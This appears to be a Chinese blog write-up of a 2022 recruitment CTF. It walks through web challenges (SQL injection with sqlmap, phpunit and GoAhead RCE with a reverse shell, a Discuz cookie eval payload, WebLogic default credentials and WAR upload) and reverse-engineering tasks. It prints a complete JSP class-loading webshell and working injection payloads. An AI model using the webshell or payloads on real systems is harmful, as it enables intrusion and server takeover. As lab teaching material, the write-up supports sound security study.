<p>如果传入了空格，会提示我们不要输入空格哦</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114213203715.png"></p>
<p>如果输入&#x2F;flag，没有回显，可能是flag是不正确的</p>
<p>其实我们可以直接用通配符，因为毕竟这里本身是cat语句</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114213252628.png"></p>
<p>Payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/GAME/f14g_in_there_hha/index.php?payload=/f*</span><br></pre></td></tr></table></figure>

<h2 id="开胃菜"><a href="#开胃菜" class="headerlink" title="开胃菜"></a>开胃菜</h2><p>这题，启动完成</p>
<p>怎么说？考了个限定字符rce？</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114215248782.png"></p>
<p>但是如果是限定字符rce，这里应该是<code> if(isset($_GET[1])&amp;&amp;strlen($_GET[1])&lt;=5)</code></p>
<p>而不是这样写，这样写的话，if里得到的永远不会是false、和0，所以if永远成立。</p>
<p>因为Strlen只要有传入值，就会有返回数值，只要是非0，if就成功。</p>
<p>所以这题可能是在迷惑我们</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114215446549.png"></p>
<p>直接cat &#x2F;flag</p>
<p>qsnctf{1546df9f-9991-48fe-a42b-2a3ef69186a2}</p>
<h2 id="Queen"><a href="#Queen" class="headerlink" title="Queen"></a>Queen</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114215825694.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114215843704.png"></p>
<p>挺好看的一个登陆页面，看看有什么东西是暗藏玄机的？</p>
<p>admin,admin登陆</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114215915924.png"></p>
<p>提示我IP不是管理员IP</p>
<p>好办，那应该是XFF，我们直接启动Burp</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114221741617.png"></p>
<p>XFF之后，有个302跳转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Date: Mon, 14 Nov 2022 14:17:30 GMT</span><br><span class="line">Location: /check.php?data=dXNlcjphZG1pbnxwYXNzOmFkbWlu</span><br><span class="line">Server: nginx/1.18.0</span><br><span class="line">X-Powered-By: PHP/7.3.22</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p>跳转到<code>/check.php?data=dXNlcjphZG1pbnxwYXNzOmFkbWlu</code></p>
<p>后面的base64内容为：</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114222019856.png"></p>
<p>user:admin|pass:admin</p>
<p>可以尝试手注</p>
<p>但是也可以试试sqlmap能不能搞出来</p>
<p>先burp抓包数据包<img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114223555220.png" alt="image-20221114223555220"></p>
<p>这里是已经附带xff的哦！</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114223640017.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114223717229.png"></p>
<p>因为标靶302重定向了另一个文件</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114224356516.png"></p>
<p>最终注入成功</p>
<p>payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin&#x27;+(SELECT 0x47694146 WHERE 9613=9613 AND (SELECT 6883 FROM (SELECT(SLEEP(5)))IHCQ))+&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114224544501.png"></p>
<p>查询到数据库中的库有这些</p>
<p>sqlmap语句为<code>sqlmap -r 桌面/data.txt -D sql --dump</code></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221114225124060.png"></p>
<p>flag为qsnctf{d8d3117d-d448-469f-ba60-45e222d634ab}</p>
<h2 id="Where"><a href="#Where" class="headerlink" title="Where"></a>Where</h2><p>下发容器</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117110437912.png"></p>
<p>好像前端只是一个单独的html静态页面，我们先扫一下站点目录。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117111009623.png"></p>
<p>诶?扫描发现这些目录：<code>admin</code>、<code>login</code>、<code>vendor</code>还有一些文件：flag.php、composer.json、test.php等</p>
<p>我们先挨个排查一下</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117111136356.png"></p>
<p>想着会不会是出题人留下的蛛丝马迹，哈哈看来不是了</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117111218733.png"></p>
<p>诶？假的小皮面板吗？</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117111254309.png"></p>
<p>终于找到了一些有用的，composer.json标明这是一套phpunit的系统，并且版本是5.6.2，这下就可以试试公开漏洞了</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117112944999.png"></p>
<p>admin页面是xx省统计局大数据平台的后台？？</p>
<p>但是貌似是没有什么用的，验证码都不变诶。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117113726158.png"></p>
<p>正好，phpunit远程代码执行漏洞是包含5.6.2的phpunit，那么我们试试看。</p>
<p>向&#x2F;vendor&#x2F;phpunit&#x2F;phpunit&#x2F;src&#x2F;Util&#x2F;PHP&#x2F;eval-stdin.php发送POST请求执行php代码</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117114846173.png"></p>
<p>哦对了，因为定义了环境变量，所以PHPInfo的Flag是无法提交的</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117114946655.png"></p>
<h2 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117120229217.png"></p>
<p>打开题目环境一看，诶？Discuz 3.4X?</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117120258452.png"></p>
<p>Wappalyzer也给出了是Discuz! X的信息</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117121943231.png"></p>
<p>goby扫出来的却是Discuz7.x或6.x</p>
<p>并且存在一个RCE的洞</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117122027913.png"></p>
<p>并且验证也是成功的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PLEASE SET COOKIE:&quot;GLOBALS[_DCACHE][ smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[c])%3B;&quot; and access &quot;/viewthread.php?tid=10&quot; and use antsword to connect then  you get webshell</span><br></pre></td></tr></table></figure>

<p>也就是说，我们需要访问<code>/viewthread.php?tid=10</code>页面，并且将cookie设置为<code>GLOBALS[_DCACHE][ smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[c])%3B;</code>接着就可以在蚁剑链接了。</p>
<p>那么我们看到replacearray后面就等于执行的命令，我们此刻不需要提权，所以直接phpinfo();或者cat flag即可。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117123639679.png"></p>
<h2 id="休息时间"><a href="#休息时间" class="headerlink" title="休息时间"></a>休息时间</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117123840342.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117125446007.png"></p>
<p>启动环境，上Goby，扫描到了GoAhead</p>
<p>GoAhead影响比较大的漏洞应该是<code>CVE-2017-17562</code>和<code>CVE-2021-42342</code>一个是命令执行，另一个则是环境变量注入。</p>
<p>威睿森通信公司，结合这个登陆页面，应该是个路由器。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117130634332.png"></p>
<p>（中间吃了个饭，qwq）</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117134422881.png"></p>
<p>访问&#x2F;cgi-bin&#x2F;index&#x2F;，有“Example”。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117135818360.png"></p>
<p>使用公开的CVE-2021-42342脚本，执行内容如上</p>
<p>漏洞存在，那么我们直接反弹shell</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117140341669.png"></p>
<p>nc收到了反弹的shell</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117140411186.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117140518300.png"></p>
<p>轻轻松松搞定Flag</p>
<h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>启动环境</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117141709431.png"></p>
<p>这个页面是正常的，没有问题</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117142414812.png"></p>
<p>dirsearch一下，发现&#x2F;console就是这个网站的后台了，会302到<code>/console/login/LoginForm.jsp</code></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117142550945.png"></p>
<p>确实是Weblogic无疑了，我们试试弱口令能否登陆</p>
<ul>
<li>weblogic</li>
<li>Oracle@123</li>
</ul>
<p>登陆成功</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117142813719.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117142908574.png"></p>
<p>可以通过【部署】、【安装】尝试上载文件。</p>
<p>选择“安装”后，点击蓝色的”上载文件“</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117142949501.png"></p>
<p><strong>这显然是一个好方法</strong></p>
<p>编写一个jsp木马，打包到war文件中</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117143821910.png"></p>
<p>上载成功</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117143913175.png"></p>
<p>接着一直下一步</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117143925613.png"></p>
<p><strong>这里不上传一句话木马，也可以利用vulhub<code>\weblogic\weak_password\web</code>中的hello.war，其中的file.jsp是配置了任意文件读取的</strong></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117144112825.png"></p>
<p>可以直接访问<code>/hello/file.jsp?path=/flag</code>得到flag。</p>
<p>当然，上传JSP木马用蚁剑得到Shell也是个好办法</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117144243226.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117144313133.png"></p>
<p>使用的Shell如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ClassLoader</span> &#123;</span><br><span class="line">        <span class="title function_">U</span>(<span class="params">ClassLoader c</span>) &#123;</span><br><span class="line">            <span class="variable language_">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public <span class="title class_">Class</span> <span class="title function_">g</span>(<span class="params">byte[] b</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">defineClass</span>(b, <span class="number">0</span>, b.<span class="property">length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] <span class="title function_">base64Decode</span>(<span class="title class_">String</span> str) throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title class_">Class</span> clazz = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) clazz.<span class="title function_">getMethod</span>(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="title class_">String</span>.<span class="property">class</span>).<span class="title function_">invoke</span>(clazz.<span class="title function_">newInstance</span>(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">            <span class="title class_">Class</span> clazz = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="title class_">Object</span> decoder = clazz.<span class="title function_">getMethod</span>(<span class="string">&quot;getDecoder&quot;</span>).<span class="title function_">invoke</span>(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (byte[]) decoder.<span class="title function_">getClass</span>().<span class="title function_">getMethod</span>(<span class="string">&quot;decode&quot;</span>, <span class="title class_">String</span>.<span class="property">class</span>).<span class="title function_">invoke</span>(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="title class_">String</span> cls = request.<span class="title function_">getParameter</span>(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">U</span>(<span class="variable language_">this</span>.<span class="title function_">getClass</span>().<span class="title function_">getClassLoader</span>()).<span class="title function_">g</span>(<span class="title function_">base64Decode</span>(cls)).<span class="title function_">newInstance</span>().<span class="title function_">equals</span>(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>密码为passwd</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117152600997.png"></p>
<p>下载附件直接扔IDA看伪代码</p>
<p>首先要输入一个值，并判断是否等于49，如果等于49就直接进入Check2</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117152652575.png"></p>
<p>Check2中，输入一个值等于256*256，这里可能是IDA的问题，判断的是0x10000。</p>
<p>接着进入Check3</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117152907155.png"></p>
<p>我们需要输入ASCII等于Y的数字，那么也就是89</p>
<p>接着会让我们输入flag，并与v1进行异或比较</p>
<p>根据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">v1[0] = 113;</span><br><span class="line">v1[1] = 114;</span><br><span class="line">v1[2] = 108;</span><br><span class="line">v1[3] = 96;</span><br><span class="line">v1[4] = 112;</span><br><span class="line">v1[5] = 99;</span><br><span class="line">v1[6] = 125;</span><br><span class="line">v1[7] = 74;</span><br><span class="line">v1[8] = 56;</span><br><span class="line">v1[9] = 113;</span><br><span class="line">v1[10] = 59;</span><br><span class="line">v1[11] = 101;</span><br><span class="line">v1[12] = 83;</span><br><span class="line">v1[13] = 65;</span><br><span class="line">v1[14] = 97;</span><br><span class="line">v1[15] = 121;</span><br><span class="line">v1[16] = 117;</span><br><span class="line">v1[17] = 78;</span><br><span class="line">v1[18] = 107;</span><br><span class="line">v1[19] = 124;</span><br><span class="line">v1[20] = 97;</span><br><span class="line">v1[21] = 52;</span><br><span class="line">v1[22] = 107;</span><br><span class="line">for ( i = 0; i &lt;= 23; ++i )</span><br><span class="line">  v1[i + 24] = i ^ v1[i];</span><br></pre></td></tr></table></figure>

<p>解密脚本应如下编写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int flag[]=&#123;0x71,0x72,0x6c,0x60,0x70,0x63,0x7d,0x4a,0x38,0x71,0x3b,0x65,0x53,0x41,0x61,0x79,0x75,0x4e,0x6b,0x7c,0x61,0x34,0x6b&#125;;</span><br><span class="line">    int b[23];</span><br><span class="line">    int c[23];</span><br><span class="line">    int i,i0;</span><br><span class="line">    int good;</span><br><span class="line">    for(i = 0; i &lt;= 23; ++i)&#123;</span><br><span class="line">      b[i] = i^flag[i];</span><br><span class="line">      printf(&quot;%c&quot;,b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117154442595.png"></p>
<h2 id="LookThis"><a href="#LookThis" class="headerlink" title="LookThis"></a>LookThis</h2><p>这道题目，其实有类似的题目出现在“第五届浙江省大学生网络与信息安全竞赛”</p>
<p>说白了，没有逆向算法的过程，只需要找资源文件</p>
<p>而这道题目使用的是Android12的SDK，并且使用了Kotlin，所以在前面逆向可能很多工具不能用。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117155229582.png"></p>
<p>压缩包打开，&#x2F;res&#x2F;mipmap-xhdpi-v4&#x2F;ic_lanchers.png就是flag了。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117160202474.png"></p>
<h2 id="EasyBase"><a href="#EasyBase" class="headerlink" title="EasyBase"></a>EasyBase</h2><p>下载附件，托IDA看伪代码</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117161441559.png"></p>
<p>这里玩了个梗：“击败龙的<em>十八</em>掌击”</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117161557503.png"></p>
<p>很典型的Base64过程</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117161624660.png"></p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117161708781.png"></p>
<p>233行是Base64，但是上面204行还有个翻转，还有一个rot18</p>
<p>大概算法我们差不多知道了</p>
<p>首先rot18这个很像base64翻转的东西</p>
<p>然后再文本倒序一次</p>
<p>倒序完成之后再base64解码</p>
<p>接着再倒序一次，就很像flag了</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117162439773.png"></p>
<p>紧接着，再ROT18</p>
<p>qsnctf{af3036f5-2d87-4c75-a51b-2f47e2611312}</p>
<p>得到Flag</p>
<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117163039690.png"></p>
<p>因为程序应该是易语言的，IDA在sub_4010A1中，对传入的值MD5后与“a4241bbfc6cab40e5b36b7a98c8621ed“对比。</p>
<p><img src="/./../img/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BWriteUp/image-20221117163539043.png"></p>
<p>并且根据题目提示：</p>
<blockquote>
<p>flag就是md5的内容，格式为qsnctf{xxxxxxx},最长字符7个，除了qsnctf和{}全是数字哦。</p>
</blockquote>
<p>我们可以用Python编写一个爆破脚本</p>
